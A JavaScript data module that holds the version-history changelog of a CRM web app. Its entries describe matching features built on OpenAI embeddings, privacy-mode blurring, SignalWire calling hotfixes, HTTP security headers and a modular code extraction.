// NLM CRM — version history data (Settings → Version History panel)
//
// MIGRATION NOTE (step 6 of the modular extraction):
// This module REPLACES the inline `const APP_VERSIONS = [...]` array that
// used to live in index.html (~line 6230). Unlike steps 3-5, this extraction
// also DELETES the inline copy in the same deploy — there are no parse-time
// concerns, because `renderVersionHistory()` (still inline in index.html)
// runs lazily on click into Settings → Version History, well after all
// module scripts have executed. The inline renderer reads
// `window.APP_VERSIONS`, which this module sets.
//
// Why this extraction was prioritized ahead of `calendar/` on the original
// roadmap: BUG-007 (2026-05-14) and BUG-009 (2026-05-16) were both caused
// by a literal `</script>` inside an APP_VERSIONS description string
// prematurely terminating the inline <script> block in index.html. Module
// scripts are parsed in JS mode from the start, so `</script>` literals
// inside THIS file do not terminate it. That class of bug is now permanently
// gone, and future entries can use literal `</script>` text without the
// escape dance. (The escapes in existing entries below are preserved as
// verbatim copies — do not refactor while extracting.)
//
// To add a new entry: prepend to the array and update CHANGELOG.md in the
// repo root.

window.APP_VERSIONS = [
  { date:'2026-05-19', time:'23:00', name:'Matching — Phase 6: OpenAI embeddings generated on "Activate for Matching"', area:'Matching, API, AI', description:'The "Activate for Matching" buttons now generate a semantic **embedding** of each VA applicant and client intake, the foundation for similarity matching (Phase 7). New auth-gated route `POST /api/forms/embed` (added to the existing `api/forms/[...path].js` catch-all — function count stays 12/12): it fetches the VA or client record with the Supabase service key, builds a semantic text blob from the matchable fields (VA: roles, industries, tools, specialization, experience, work history, working style, etc.; client: industry, role needed, required skills/tools, English level, notes), calls OpenAI **text-embedding-3-small** to produce a 1536-dim vector, and writes `embedding` + `activated_at` (+ `review_status=shortlisted` for VAs) back to the row. The button click flow changed from a direct Supabase update to this endpoint, so activation = "review profile + generate match vector" in one step. **Client intakes** gained an Activate-for-Matching button (table + modal) mirroring the VA pattern. If OpenAI fails or the key is missing, the endpoint returns a clear error and writes nothing — the operator can retry. **Requires `OPENAI_API_KEY` in the Vercel environment** (Production + Preview); until it is set, clicking Activate shows "OPENAI_API_KEY not set". Embeddings are semi-automatic by design — only generated for applicants/clients an admin has reviewed and activated, keeping the (already negligible ~$0.00002/record) cost tied to deliberate action. **NOT in this deploy:** pgvector similarity search across the activated pool (Phase 7) and GPT-4o-mini "why is this a good fit" explanations (Phase 8). Calling code untouched.', commit:'8f6596f' },
  { date:'2026-05-19', time:'22:00', name:'Matching — VA/Client matching foundation: public forms, CRM review pages, Form Options manager', area:'Matching, UI, Build, API', description:'First deploy of the VA↔Client matching system. **Public application forms** (hosted on Vercel, no login): `/apply.html` — a 5-tab Virtual Assistant application (Personal Info, Experience, Skills & Tools, Availability & Rates, Fit & Personality) with dynamically-loaded options and searchable multi-select tag inputs for tools; `/client-intake.html` — a 3-tab client intake (Business Info, Requirements, Budget & Timeline). Both fetch their dropdown/checkbox options live from the database so admins can change them without a code deploy. **CRM review pages** under a new **Matching** sidebar section: **VA Applicants** (table with status-filter pills, search, a detail modal showing every field, status management + reviewer notes, and an "Activate for Matching" button that sets `activated_at` + shortlisted status) and **Client Intakes** (same pattern: requirements, skills/tools chips, budget, status, notes). **Form Options manager** under Settings → manage the options shown in both forms (add/edit/deactivate tools, skills, industries, roles, timezones; category tabs + search + full CRUD). **Backend:** consolidated into ONE serverless function `api/forms/[...path].js` (`GET /api/forms/options?form_type=va|client`, `POST /api/forms/va`, `POST /api/forms/client`) — rate-limited (5 submissions / 10 min / IP), field-whitelisted, writes via the Supabase service key. **Supabase schema:** pgvector extension enabled; new tables `form_field_options` (140+ seeded options), `client_intakes`, `va_matches`; `va_applicants` gained `embedding vector(1536)` + `activated_at` columns for the semantic-matching phase to come. **Critical deploy note (BUG-021):** this feature initially failed to deploy four times in a row because three separate API files pushed the project past Vercel Hobby\'s hard 12-Serverless-Function limit; deploys errored silently (git push succeeded, site kept serving old code). Fixed by consolidating the three files into the single catch-all above. **We are now at 12/12 functions — any new `api/*.js` file will silently break all deploys.** Calling code was not touched. **NOT in this deploy** (next phases): OpenAI embedding generation behind the "Activate for Matching" button (Phase 6), pgvector similarity search (Phase 7), GPT-4o-mini match explanations (Phase 8).', commit:'3ea6cd7' },
  { date:'2026-05-19', time:'18:00', name:'Tools — new Settings-tier page with a Form tab (scaffold only, not wired)', area:'UI, Build', description:'Scaffold-only deploy. Added a new **Tools** sidebar item above Tags in the Settings nav group, with a wrench icon. Clicking it opens `page-tools` which renders a tab strip with one tab labelled **Form**; the tab body is a "Coming soon" placeholder. State machinery: `let toolsView = \'form\'`, `setToolsView(view)` flips the active tab + re-renders, `renderToolsPage()` is the renderer. Wired into the navigation system: `tools:\'Tools\'` added to `PAGE_TITLES`, `if(page===\'tools\') renderToolsPage()` added to `navigate()`. **Permission-gated** with `tools:\'settings\'` in `PAGE_PERMISSION` — same as Integrations / Custom Fields / Settings (admin-default; members/viewers don\'t see it unless an admin flips their `settings` permission on). **Nothing is connected to backend yet** — no Supabase tables, no `/api/` endpoints, no form HTML inside the Form tab. Purely the shell + nav routing. More tabs (and the actual form bodies) come in follow-up deploys after the schema + RLS work is designed. **Verification:** sign in as admin → Tools appears above Tags in the sidebar with the wrench icon; click → page header reads "Tools", tab strip shows "Form" active, body shows the placeholder. Sign in as a member without `settings` permission → Tools is hidden; direct `navigate(\'tools\')` redirects to dashboard with the "no access" toast. No existing pages or render functions touched.', commit:'c9b345d' },
  { date:'2026-05-19', time:'17:30', name:'Privacy Mode — auto-route phone-as-name + mask phones inside conv preview body (follow-up coverage)', area:'UI, Privacy', description:'Follow-up to the 17:00 deploy after a screen-share showed three remaining gaps. **NOTE: deployed as a single combined commit `20b9e88` with the 17:00 entry below.** **Gap 1: Conversations list (Calls tab + main list) showed unmatched-caller titles as raw phone strings** — e.g. "(252) 390-7157" / "+12523907157" appeared in full. Root cause: when no contact matches a call, the title field falls back to the raw phone string, and the old code wrapped it with `pName` which treated it like a name (no-space variants showed fully; space-formatted variants showed the first chunk). **Gap 2: Conversation list preview body showed phone numbers inline** — the preview text for call entries is rendered from the message body which contains "📞 Outbound call to +12523907157" (literal phone in arbitrary text). Old code passed `preview` straight through without escape or blur. **Gap 3: Dialer history rows + floating dialpad call-history rows had the same phone-as-title issue.** **Fix:** added three new helpers near the existing `pPhone`/`pEmail`/`pCompany` block in the privacy module: `looksLikePhone(s)` (true when the string is ≥7 digits and matches `/^[+()\\d\\s\\-.]+$/` — handles +E.164, plain digits, (XXX) YYY-ZZZZ, and dash-separated formats), `pNameOrPhone(s)` (auto-routes to `pPhone` when looksLikePhone is true, else `pName` — used for fields that can hold either a real name OR a phone fallback), and `pMaskPhonesInText(text)` (escapeHtml the text then regex-replace any phone-shaped substring with `<span class="pblur">...</span>` — used for the conversation preview body which embeds call-log strings). Replaced the manual phone-vs-name branching in `renderConvList` (Calls tab title + main list title), `dialerHistRowHTML`, and `renderCallHistory` (floating dialpad) with single `pNameOrPhone(...)` calls. The Calls-tab subline number "var(--text3)" span now also wraps through `pPhone(c.number)` (it was raw before). Conv-list preview body now passes through `pMaskPhonesInText(preview)` — also escapes HTML as a free side-benefit (the body was being injected raw before). **VERIFICATION** after deploy: open Conversations with privacy mode ON — unmatched-caller titles like "(252) 390-7157" should blur fully; preview lines like "Outgoing · 5s · (719) 644-6212" should have the phone substring blurred; the dialer "Call History" tab and the floating dialpad call-history list should both blur unmatched-caller phone titles. **No regressions expected** — every change is gated by `privacyMode` (the helpers themselves no-op when off).', commit:'20b9e88' },
  { date:'2026-05-19', time:'17:00', name:'Privacy Mode — full-blur phone/email/company everywhere + dialer/call-widget/calendar/email coverage', area:'UI, Privacy', description:'Expanded Privacy Mode from "partial blur" (showing prefix of each field) to **full blur** for phone numbers, emails, and company names. Names still show first-name-only (rest blurred via `pName`), matching the prior behavior. Updated the three helpers in the privacy-mode block: `pPhone(phone)` now wraps the entire phone string in `<span class="pblur">` instead of revealing the area code; `pEmail(email)` blurs the whole address instead of showing the first 4 chars; `pCompany(company)` blurs the whole name instead of showing the first 3 chars. Also patched every render path that was bypassing the helpers and rendering raw fields — the user reported that even with the privacy toggle ON, many sections still leaked PII during screen-shares. Coverage added: **Dialer page** — `renderDialerContactPanel` (the contact card next to the queue: name + company + status pill, phone, email, tag chips), `renderDialerNowCalling` countdown card / in-progress card / "Up next" card (contact name + phone), the "Calling from" caller-ID line at the bottom of the up-next card, `renderDialerQueue` rows (already used helpers — kept), `renderDialerNumberPicker` (the side panel listing your own SignalWire numbers), `dialerHistRowHTML` (the per-call rows in the dialer-history modal — name/phone fallback + the subtitle "phoneFmt · timeStr"), `renderDialerSearchResults` (the dropdown when you type in the dialer search box). **Floating dialpad popover** — `renderDialpadCallerPicker` (single + multi-number variants), `renderCallHistory` (the 20-row scroll list inside the popover — both display name and subtitle), the "From:" line shown inside the active-call view (`dp-call-from`). **Active call widget** — `setCallActive(name, number)` switched from `.textContent` to `.innerHTML` so the helpers can inject blur spans into `#call-active-name` and `#dp-call-name`; same for `dialpadSetCallerNumber` which writes to `#dp-call-from` after the user picks a different caller ID mid-call. **Incoming call card** — `showIncomingCallUI` now routes through `pName` if a matched contact name is being shown vs. `pPhone` if the field is a fallback phone string, and the subline blurs via `pCompany` or `pPhone` depending on which fell through. **Contact-modal tags tab** + **Bulk Add/Remove Tags modal tag chips** + **Bulk Delete contact preview list** + **Dashboard "Recent contacts" widget** + **Calendar contact-filter search dropdown** + **Calendar event-guest list (emails) ** + **Calendar upcoming/follow-ups list (contact name line)** + **Tags page "view contacts tagged X" modal (header + rows)** + **Email list** (`renderEmailList` displayName + the "from: X" badge) + **Email detail header** (From / To / contact name in parens) + **Email thread quote lines** (the sender label). **Deal autocomplete dropdown** in the New Deal modal also patched (name + small company line). **`renderSwFromPicker`** (SMS composer "From: SW number" select dropdown) — selects can\'t embed HTML in option text, so added a new CSS rule `body.private-mode .priv-blur-el { filter: blur(5px) }` and put the class on that `<select>` element. **`togglePrivacyMode` re-render coverage massively expanded** — previously only re-rendered contacts/dialer/conv-list/board/contact-detail; now also re-renders dialer-queue, dialer-now-calling, dialer-history, dialer-number-picker, dialer-contact-panel, call-history (floating dialpad), dialpad-caller-picker, conv-info-panel, email-list, calendar, upcoming-events, followups-list, dashboard, and tags-page, and adds/removes the `body.private-mode` class so the new `.priv-blur-el` CSS rule activates immediately. Initial body-class also applied on load if the saved `nlm_privacy === \'1\'`. **VERIFICATION:** with privacy mode ON, open every section the user listed (Contacts, Pipelines/Deals, Dialer queue + Up Next + History + Number Picker, floating mini-dialer + its history, Calendar, Conversations + SMS thread info panel, Email list + detail) — phone numbers, emails, and company names should be fully blurred (not just the suffix); tag chips should be blurred; first names should still be readable. Toggle OFF and everything reveals immediately without a refresh. **OUT OF SCOPE intentionally** (form inputs and admin lists): edit-mode form `<input>` fields for phone/email/company stay readable because the operator is editing those; the Team Members card under Settings (own staff emails) and the Integrations email-accounts list (own email accounts) also stay readable — those are the operator\'s own internal data, not contact PII the operator would screen-share to a contact. Social Planner has no contact PII to blur. CSV import preview is a transient dialog and was left alone.', commit:'20b9e88' },
  { date:'2026-05-19', time:'16:00', name:'Calling — BUG-020 round 6: strip ALL SDK-internals instrumentation to restore working state', area:'Calling, Hotfix, Revert', description:'**After the round-5 revert, calling still appeared broken end-to-end** — outbound calls connected at the WebRTC layer per error_logs but the user heard no ringback; inbound calls never delivered invites. Diagnostic finding: the outbound test was dialing the user\'s OWN SignalWire DID (`+18325832601`), so "no ringback" was the same inbound-delivery bug surfacing as the called number — the call comes back to the CRM as an inbound invite that never arrives. **One root cause, two symptoms.** Two hypotheses for why round-5 didn\'t fully restore working state: (a) my emit monkey-patch and `sw_client_shape` dump still touch SDK internals (Object.getPrototypeOf, wrapping eventEmitter.emit if found) — even if they didn\'t cause the original regression, they\'re extra surface area we don\'t need; (b) the user\'s SignalWire subscriber session may have entered a bad state on the SignalWire server side during the round-4 broken window, persisting across page reloads until a fresh token + new subscriber identity is created. **This deploy fixes (a) by stripping ALL SDK-internals instrumentation from `initSWClient`.** Removed: the 4-target emit monkey-patch loop, the sw_client_shape dump. Kept (proven safe): `_pcOf` helper (handles rtcPeerMap shape), the PROBE_EVENTS listener in `attachCallTeardown` (member.left + room events fire correctly), the pre-accept invite-cancel probe listeners + 25s timeout. **For (b), the user-side fix is:** (1) hard-refresh the browser (Ctrl+Shift+R) to fully clear cache, (2) sign out and sign back in to force `/api/call-token` to mint a fresh subscriber token + new SignalWire client identity. **Verification:** after deploy + hard refresh + relogin, all four real-time hangup paths from round 5 should still work (outbound Drop, outbound remote-hangup of connected, inbound Decline, inbound remote-hangup of connected). Inbound caller-drops-pre-accept falls back to ≤25s timeout. **The lesson from rounds 4-6:** when chasing an SDK detection bug, never touch SDK internals (constructor subclassing, prototype patching, emit wrapping) without an isolation switch. The next attempt at pre-accept cancellation detection should be a server-side webhook to a new `/api/call-status` endpoint that the frontend polls — cleaner than any client-side SDK introspection.', commit:'e14f46b' },
  { date:'2026-05-19', time:'15:30', name:'Calling — BUG-020 round 5: REVERT WebSocket wrap (it broke inbound invites)', area:'Calling, Hotfix, Revert', description:'**Round-4 regression hotfix.** The WebSocket constructor wrap from round 4 broke incoming-call delivery — `error_logs` after deploy showed zero `sw_inbound_invite_raw` despite `sw_inbound_register: online() succeeded` firing normally. Subscriber goes online, but no invites arrive at the JS handler. The likely cause: the SignalWire SDK performs some identity/prototype check on the WebSocket instance that the `class _NlmWS extends WebSocket` subclass silently fails, breaking the SDK\'s internal notification dispatch. **Solution: rip the wrap out.** Risking total calling breakage to chase the 10-15s pre-accept-cancel lag is the wrong tradeoff. **Good news from the round-4 data:** with the PC lookup fix shipped in round 3, **`member.left` AND `call.state` both fire correctly via the SDK\'s normal event channel for connected calls** — we saw both fire 16 seconds after answer in the round-4 logs (timestamps 14:18:28.501 `member.left`, 14:18:28.503 `sw_call_teardown:member.left:unknown`, 14:18:28.530 `call.state:ending`). So **real-time hangup detection on connected calls is now working** through the existing PROBE_EVENTS listener — no transport interception needed. The only remaining gap is pre-accept invite cancellation, which still falls back to the 25-second timeout. **State after this deploy:** ✅ Outbound user-press-Drop → instant (BUG-015 path); ✅ Outbound remote-PSTN-hangup of connected call → real time (member.left/call.state via SDK); ✅ Inbound user-press-Decline → instant; ✅ Inbound remote-PSTN-hangup of connected call → real time (same path); ⏳ Inbound caller-drops-before-accept → up to 25 seconds (acceptable fallback). **What\'s NOT in this deploy:** the proper fix for pre-accept cancellation — a future deploy could either (a) explore the `incomingCallHandlers` SDK config for a documented cancellation handler, (b) use a careful non-subclass WebSocket observer that wraps `addEventListener` rather than the constructor, (c) accept the 25s timeout as permanent (no proper API exists for this). **Verification:** all four "real-time" scenarios above should work; pre-accept cancel falls back to ≤25s. Calling should work normally (no regression from round 4).', commit:'5d31ca0' },
  { date:'2026-05-19', time:'14:30', name:'Calling — BUG-020 round 4: WebSocket-level Verto BYE detection (real-time invite cancel)', area:'Calling, Bugfix', description:'**Fourth hotfix.** Round 3 instrumented `swClient.emit()` to capture every event. After a real test the `error_logs` showed **zero `sw_emit` rows** — none of the four candidate emitter paths (`swClient`, `swClient.eventEmitter`, `swClient._emitter`, `swClient._eventEmitter`) exposed an `emit()` method. SignalWire\'s Fabric client does not use a classic EventEmitter for the cancellation path; the SDK relies on internal Redux Saga state for invite lifecycle. But the cancellation message IS arriving from the server — `declineIncomingCall` returns "CALL DOES NOT EXIST" after the caller drops, proving the server sent a CANCEL the client received but never fired as a JS event. **Solution: intercept the WebSocket directly.** SignalWire Fabric uses the Verto JSON-RPC protocol over a single WebSocket connection. `verto.bye` / `verto.destroy` is the explicit "this call is ended" message and includes the `callID` in `params`. We now wrap `window.WebSocket` BEFORE `SW({token})` is called, attaching a `message` listener to every socket the SDK opens. Each incoming message is filtered (must contain `verto.` or `bye`/`cancel`/`destroy`/`hangup`/`ended`, must be ≤8KB), JSON-parsed, and matched: if `method` is a terminal verb AND the `callID` matches the current `pendingInvite.details.callID`, we stop the ringtone + hide the card + log the missed call instantly — same cleanup as `declineIncomingCall`, just triggered by the WS message instead of a button click. Same matching for connected calls: if `swCall.dialogParams.callID === callID`, we call `endCall()` directly. Both via a `ws_invite_cancel_match` or `ws_call_cancel_match` log line so we can see the path firing. **Idempotent wrap** via `window.__nlmWSWrapped` so a SignalWire client reconnect doesn\'t double-wrap. **Also added** a one-shot `sw_client_shape` log on every fresh client (own + prototype property names) so the next time we need to find an internal path we have the data. **What\'s NOT in this deploy:** the matching wrap on `src/calling/index.js` — strangler-fig phase, inline copy is authoritative for production; module is dead code today, will sync in a future cleanup. **Verification (this should be the last round):** (1) inbound call, **caller drops before you accept** — ringtone + card should clear within ~100ms (versus 10-15s before); `error_logs` will contain a `ws_invite_cancel_match` entry with the verto method name. (2) inbound call, answer it, talk briefly, **remote hangs up** — should also clear in real time via either the existing `sw_call_event:destroy` path OR a new `ws_call_cancel_match` entry. (3) outbound call, press Drop — should still work (BUG-015 path unchanged). Send me the latest `ws_msg` + `ws_invite_cancel_match` rows from `error_logs` and we\'ll trim the heuristic filter to just the real verb(s).', commit:'c0008e6' },
  { date:'2026-05-19', time:'12:30', name:'Calling — BUG-020 round 3: PC lookup for Fabric Room Session + emit-level instrumentation', area:'Calling, Bugfix, Instrumentation', description:'**Third hotfix on top of the BUG-020 deploys at 09:30 + 10:30.** Smoke test result: pressing Drop locally drops in real-time (good, BUG-015 path solid), but the remote-caller-drops-pre-accept scenario still kept the ringtone going ~10–15 seconds. Three findings drove this deploy: (1) **`sw_call_no_pc` log fired on the last accepted call** — our PC lookup `call.peer.instance || call.peer.peerConnection || call.peerConnection` matched zero paths on the actual SDK build. From the `sw_call_keys` dump the live shape is a `FabricRoomSession` that stores PCs in a `rtcPeerMap` keyed by `activeRTCPeerId`. (2) **Zero `sw_inbound_cancel` rows fired** — none of the probe event names from the 10:30 deploy (cancelled, ended, expired, call.invite.cancelled, etc.) matched what SignalWire actually emits, so the ringtone path relied entirely on the 45s safety timeout (and even that didn\'t fire in the test window — the user just experienced "rings forever" until something else stopped it). (3) **Decline-after-caller-dropped returned `CALL DOES NOT EXIST`** — proves the SignalWire server *did* receive the CANCEL message and cleared the call; the client just never emitted a JS event we listen for. **Three fixes:** (a) New `_pcOf(call)` helper handling all five SDK shapes — `peer.instance` / `peer.peerConnection` / `peerConnection` (older builds), plus `rtcPeerMap.get(activeRTCPeerId).instance` / `.peerConnection` / `.pc` (Fabric), with a fallback that iterates `rtcPeerMap.values()` if `activeRTCPeerId` is missing. Updated all 6 callsites (inline `attachCallAudio` + `attachCallTeardown` + `endCall`; module copies of the same three). Now the ICE safety net + force-close PC path actually fire for inbound calls. (b) **Monkey-patch the SDK\'s event emitter in `initSWClient`** to capture every event the client emits. Tries 4 emitter targets (`swClient`, `swClient.eventEmitter`, `swClient._emitter`, `swClient._eventEmitter`); whichever has an `emit()` method gets wrapped. Each emission writes `sw_emit` to `error_logs` with the event name + truncated arg payload + which target wrapped it. After one cancelled-invite test we\'ll know the real event name(s) — followup will replace the probe set with a single targeted listener and remove this instrumentation. Wrapped in try/catch since SDK internals aren\'t public contract. (c) **Safety timeout 45s → 25s** in `handleIncomingInvite` — closer to phone-typical ring-before-voicemail duration (~20–30s). The proper fix is the targeted listener; this just shortens the worst-case from the prior 45s. **What\'s NOT in this deploy:** the actual targeted listener — we need ONE real cancelled-invite test with `sw_emit` instrumentation live first to know the event name. Once we see the data the followup is small (~5 LOC). **Verification:** (1) make an inbound call, **answer it**, talk for 10+ seconds — `sw_call_no_pc` should no longer fire; `sw_call_ice` / `sw_call_pc_state` should appear; remote hangup should tear down in real time via either an `sw_call_event` probe match or the ICE/PC-state safety net. (2) make an inbound call, **caller drops before accept** — ringtone keeps going up to 25s worst case, but `error_logs` will now contain `sw_emit` rows for every event SignalWire emitted during the cancel window. Send me the names from the most recent `sw_emit` rows after that test and I\'ll trim to a targeted listener.', commit:'014ae62' },
  { date:'2026-05-19', time:'10:30', name:'Calling — BUG-020 follow-up: fix 3s drop after answer + ringtone keeps playing on caller-cancel', area:'Calling, Bugfix', description:'**Two-issue hotfix on top of the BUG-020 deploy from an hour ago.** Smoke-testing surfaced: (1) inbound calls would drop ~3 seconds after answer — my new ICE safety net was firing during call setup; (2) inbound ringtone kept playing for 15–20+ seconds after the caller hung up before accept — no listener for invite cancellation. **Fix 1 — `wasConnected` guard in `attachCallTeardown` ICE safety net:** ICE state can briefly transit through `disconnected` / `failed` BEFORE first reaching `connected`, especially on inbound accept where WebRTC re-negotiates after `invite.accept()` resolves. My previous unconditional teardown on those states caused the answer-then-drop bug. Now the ICE listener tracks a `wasConnected = false` flag, sets it true only when iceConnectionState reaches `connected`/`completed`, and ignores all failure states until then. After the call has established at least once, the original teardown logic applies (`failed`/`closed` immediate, `disconnected` with 2s re-check). Also added a `connectionstatechange` listener (the higher-level RTCPeerConnection state — `failed`/`disconnected`/`closed` here is semantically cleaner than the ICE substate). **Fix 2 — invite cancellation listeners in `handleIncomingInvite`:** the invite object exposes only `details`/`accept`/`reject` (confirmed from the `sw_inbound_invite_raw` logs) — no documented event API. We now probe candidate cancellation events on both the invite (`cancelled`, `cancel`, `ended`, `end`, `expired`, `reject`, `rejected`, `destroy`, `destroyed`, `timeout`) and the `swClient` (`call.invite.cancelled`, `invite.cancelled`, `incomingCallCancelled`, `call.cancelled`, `invite.ended`, `call.ended`), with try/catch around each so unknown event names silently skip. Each handler logs `sw_inbound_cancel` with the matching event name so a future trim pass knows which one(s) actually fire. **Plus a 45-second safety timeout** (standard ring-no-answer / voicemail handoff duration) — if no cancellation event fires and the user neither accepts nor declines, the ringtone + card + missed-call log all fire from the timeout path. All paths null `pendingInvite` and check `pendingInvite === invite` before acting so they\'re no-ops if accept/decline already ran. **What\'s NOT in this deploy:** (1) trimming the probe-event list — needs one or two real cancellation tests with these listeners live first; (2) using `swClient.online()`\'s `incomingCallHandlers` config to subscribe to a documented cancellation handler (would need SignalWire SDK docs we don\'t have on hand — probe approach gets us 90% there without). **Verification:** (a) inbound call → answer in our CRM → both sides talk for 10+ seconds → confirms the 3s drop is gone; (b) inbound call → caller hangs up before we accept → ringtone should stop within ~1 second of the cancel event firing (or 45 seconds via timeout fallback if no event fires).', commit:'3a42aea' },
  { date:'2026-05-19', time:'09:30', name:'Calling — remote-hangup now ends the call in our dialer (BUG-020)', area:'Calling, Bugfix', description:'**Hotfix — outbound.** When the remote PSTN side (e.g. a Quo softphone) ended a connected call by dropping the line on their end, our CRM stayed stuck in the "On Call" UI: the timer kept counting, swCall + callTimer never cleared, and the single-active-call guard at startCall blocked the next dial. Root cause from error_logs: across every recorded call, `call.on(\'call.state\', ...)` has NEVER fired — the Fabric SDK\'s room session emits room-/member-scoped events instead, and our only remote-side listener was the dead `call.state` one. Two-layer fix in `attachCallTeardown` (mirrored in inline + src/calling/outbound.js): (1) **Wider event probe** — subscribe to `destroy`, `destroyed`, `room.left`, `room.ended`, `room.destroyed`, `room.session.ended`, `call.ended`, `call.state`, and crucially **`member.left`** (the event that fires when the remote PSTN peer disconnects in a 1:1 Fabric room). The `member.left` handler ignores our own member-leave (which fires after we hit Drop and call hangup()) by comparing `ev.member.id` against `call.selfMember.id` — only the REMOTE leaving counts as the call dropping. Every event that fires is logged to `error_logs.sw_call_event` so the next real call surfaces which event name SignalWire actually emits for this scenario, letting us trim the probe set in a followup. (2) **SDK-agnostic ICE safety net** — attach an `iceconnectionstatechange` listener on the underlying RTCPeerConnection (grabbed via the same three-path lookup used by attachCallAudio + endCall: `call.peer.instance || call.peer.peerConnection || call.peerConnection`). When ICE transitions to `failed` or `closed`, tear down immediately. When ICE transitions to `disconnected` (which can be a transient network blip), schedule a 2-second re-check and tear down only if still disconnected. The ICE path catches BUG-020 even if every event in the probe set turns out to be wrong, because the WebRTC media path PHYSICALLY dies when the remote PSTN leg ends — no SignalWire event needed. Belt-and-suspenders, same pattern as the BUG-015 fix. **Symmetry note:** BUG-015 was the opposite direction — pressing Drop in our CRM left the remote PSTN phone ringing because `swCall.leave()` only signals the local subscriber departing the room; the fix was to prefer `swCall.hangup()` for outbound PSTN dials. BUG-020 is the same Fabric-room-vs-call confusion in the inbound-teardown-event direction. **What\'s NOT in this deploy** (separate followups): the `+11908743870` doubled-prefix bug that caused 4 not_routable 422s in this morning\'s test session — separate phone-number normalization issue; trimming the probe event list once we see which event Fabric actually emits — needs one or two real remote-hangup tests with these new listeners live first. **Verification:** make an outbound call from the CRM to a real phone, answer it, then hang up FROM THE REMOTE PHONE. Within ~3 seconds the CRM should return to idle (call widget back to idle state, timer cleared, swCall null). DevTools console will show `sw_call_event` and `sw_call_ice` log lines for the events that fired. If the UI is still stuck after 5s, check the Supabase error_logs for the latest `sw_call_*` rows.', commit:'5a0f2c6' },
  { date:'2026-05-18', time:'18:30', name:'Security — add HTTP security headers to vercel.json (HSTS, X-Frame-Options, Referrer-Policy, Permissions-Policy)', area:'Security', description:'Light hardening pass — adds 5 standard HTTP security response headers via Vercel\'s edge routing. Applies to every path via the catch-all `/(.*)` source. Headers: **X-Frame-Options: DENY** (blocks the CRM from being embedded in an iframe — prevents clickjacking attacks where an attacker overlays the CRM under a fake UI), **X-Content-Type-Options: nosniff** (browser won\'t MIME-sniff responses; prevents `Content-Type: text/plain` payloads from being executed as JS), **Strict-Transport-Security: max-age=31536000; includeSubDomains** (forces HTTPS for 1 year on the live domain + every subdomain; defends against SSL-strip downgrade attacks), **Referrer-Policy: strict-origin-when-cross-origin** (when the CRM links to another origin, only the scheme/host/port is sent — not the path/query that might contain contact IDs, deal IDs, etc.), **Permissions-Policy** (disables browser features the CRM doesn\'t use: geolocation, camera, payment, USB, magnetometer, gyroscope, accelerometer; explicitly allows microphone for the SignalWire calling feature via `microphone=(self)`). **NOT included** (deliberate omissions): (1) **Content-Security-Policy** — would require removing `unsafe-inline` and refactoring every render function from template literals + innerHTML to document.createElement, which is a multi-week project tracked in BACKLOG; (2) **Cross-Origin-Embedder-Policy / Cross-Origin-Resource-Policy (COEP/CORP)** — would break the SignalWire SDK CDN load from cdn.jsdelivr.net unless jsdelivr serves the right CORS headers; safer to skip; (3) **HSTS preload directive** — `preload` requires manual submission to hstspreload.org, separate one-time process. **Verification:** after Vercel finishes the deploy, hit `https://mynextlevel-crm.vercel.app/` with `curl -I` and confirm all 5 headers are present in the response. Browser DevTools → Network → click a doc → Headers tab also shows them. No behavioral changes expected — the app should look and work exactly the same.', commit:'4b5a94b' },
  { date:'2026-05-18', time:'17:30', name:'Build — extract src/calling/dialpad.js (step 13d: call-widget floating dialpad popover)', area:'Build, Calling, Dialer', description:'FOURTH file in src/calling/. Strangler-fig — purely additive ES module duplicating the 10 functions behind the floating dialpad popover (the small panel hanging off the call widget with number input, dialpad keypad, contact-match line, and caller-number picker): `openDialpad` (show popover + restore saved position + refresh picker + render call history), `closeDialpad` (hide popover), `dialpadPress(key)` (append digit to dial input + re-run contact match), `dialpadBackspace`, `matchDialpadContact(num)` (lookup `contacts` by digits-only match, show matched name above input), `initiateCall(id, phone, name)` (pre-fill dialpad for a specific contact, set activeCallContact, open dialpad, show contact name), `fmtPhoneDisplay(raw)` (1XXXYYYZZZZ → "(XXX) YYY-ZZZZ" — used here AND across the rest of the app), `renderDialpadCallerPicker` (render the "From: caller number" line + multi-number dropdown shared with the dialer page caller picker via setDialerActiveNumber), `toggleDialpadCallerMenu` (open/close dropdown), `dialpadSetCallerNumber(num)` (picker click handler — writes via setDialerActiveNumber + re-renders picker + reflects into in-call "From:" line if a call is active). Loaded as the 26th ES module via `<script type="module" src="src/calling/dialpad.js?v=2026-05-18-7">` after src/calling/inbound.js. Inline copies remain authoritative for every callsite (the call widget toggle button\'s `openDialpad()` onclick, the dialpad keypad buttons that call `dialpadPress(\'5\')` etc., the in-call DTMF buttons that share the same keypad, the per-contact "Call" buttons everywhere that call `initiateCall`, the dialer-page caller picker that mirrors this widget). **One new state-mirror entry:** `dialpadOpen` (let, reassignable — flipped by openDialpad/closeDialpad). Mirror block is now **51 vars**. DELIBERATELY OUT-OF-SCOPE for this file (kept inline as parse-time boot infra): `applyDialpadSavedPosition` / `_clampDialpadPos` / `resetDialpadPosition` and the `(function initDialpadDrag(){...})()` IIFE that wires up the draggable-window pointer event listeners; also the `document.addEventListener(\'click\', ...)` outside-click handler for the caller menu. These have parse-time side effects that don\'t fit the "purely additive" strangler-fig pattern cleanly. ADAPTATIONS from verbatim: state vars via window.* (`dialpadOpen`, `activeCallContact` from 13b, `contacts`); inline function refs via window.* (`applyDialpadSavedPosition` typeof-guarded for the drag infra; `renderCallHistory`; `getSwPhones` typeof-guarded for the integrations helper; `getDialerActiveNumber` + `setDialerActiveNumber` typeof-guarded — both land in 13e dialer page; `cleanCallerNumber`; `navigate`); module-local refs called bare (`renderDialpadCallerPicker` from openDialpad; `fmtPhoneDisplay` from renderDialpadCallerPicker + dialpadSetCallerNumber; `matchDialpadContact` from dialpadPress + dialpadBackspace; `openDialpad` from initiateCall). References inside HTML attribute strings (`closeDialpad`, `navigate`, `toggleDialpadCallerMenu`, `dialpadSetCallerNumber`) are LEFT BARE — resolve via window from inline hoisted-function declarations because the dialpad DOM lives in the global document. VERIFICATION: `window.__nlmCallingDialpadLoaded === true` in DevTools after deploy. The floating dialpad opens + closes + accepts keypresses + matches contacts as you type + the caller-number picker dropdown works + initiateCall pre-fills correctly from contact rows everywhere. **ROADMAP:** 13e (dialer page core — renderDialerPage + queue + now-calling + search results + number picker), 13f (history + report), 13g (disposition + autodial) follow as separate deploys. Dialer surface is genuinely large (~30 functions across ~1000 lines); splitting carefully so each deploy stays reviewable.', commit:'093fd8f' },
